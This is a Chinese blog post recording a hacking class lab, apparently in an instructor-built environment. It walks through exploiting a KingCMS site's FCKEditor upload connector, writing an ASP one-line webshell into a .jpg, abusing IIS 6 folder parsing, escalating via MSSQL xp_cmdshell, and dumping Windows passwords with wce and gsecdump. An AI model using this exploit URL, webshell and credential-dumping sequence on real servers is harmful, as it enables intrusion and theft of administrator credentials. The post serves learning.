---
layout: page  
title: The Hacker Way(1)  
category: 技术  
tags: Hacker   
---
{% include JB/setup %}

今天正式进入“十个小伙伴的故事”实战。这节课没有多余的废话，就是实战。

猥琐的老湿在他自己搭建的环境上演示了一把入侵，然后分析了下入侵的细节，然后我们便依样画葫芦的进行了一遍入侵。尽管只算是个小模拟，但是小心脏还是扑通扑通的兴奋。

今晚是第一次接触“入侵”，对于大部分概念不甚理解。现在只能记录下大概的操作步骤，作为记录。

这次的入侵是利用了网站的FCKEditor文件上传漏洞。

##### Step1. 定位漏洞，创建特殊文件夹名，再执行文件解析漏洞得到webshell
其实这里的难点应该是定位漏洞，不过作为第一次的实战课，老湿侧重让大家体验入侵的过程，省略了定位的过程。   

- 通过漏洞新建一个文件夹`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/hack.asp&NewFolderName=hack.asp`
- 进入操作界面
`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/asp/connector.asp`
- 制作包含ASP webshell代码的正常后缀名文件, 例如jpg文件
echo "<%execute(request("MH"))%>" >> jinbin.jpg
- 上传此文件至刚才新创建的文件夹内
此处利用了IIS 6处理文件夹扩展名时，将/\*.asp/目录下的所有文件都作为ASP文件进行解析的漏洞。此时，IIS 6将jinbin.jsp作为ASP文件处理。

##### Step2. 查找可进行提权的漏洞
完成第一步，仅仅只能获得普通权限，一般情况下其实什么也做不了。所以，找到提权的漏洞是第二步。

- 浏览目录结构，找到提权途径，一般分为以下几种：
  - 数据库
  - web应用程序
  - OS
  - 第三方软件
  - DLL劫持
  - 启动项 (...)  

此处利用里数据库的漏洞。所以把注意力放到配置文件中，找到数据库配置信息。一般来说，数据库信息都经过了加密，所以要学会解密(解密过程没怎么讲，所以略过)。

##### Step3. 服务器提权
利用植入的大马(猥琐的老湿事先已经准备好)，和Step2中得到的用户名、密码，通过MSSQL的扩展存储xp_cmdshell可直接执行命令，且权限为system

##### Step4. 获取账号hash
1. wce 可以通过wce -w 获取目前正处于登录状态的所有账号明文密码。   
   WCE全称Windows Credentials Editor。
2. gsecdump 可以通过gsecdump -a 获取处于这台服务器上的账号密码hash，然后通过彩虹表进行破解.  
这里可以参考http://www.objectif-securite.ch/en/ophcrack.php (在线LM Hash破解网站)  

这里的命令都利用了Step3 中的xp_cmdshell来执行。

至此，主机的管理员用户名及密码都已经到手了。
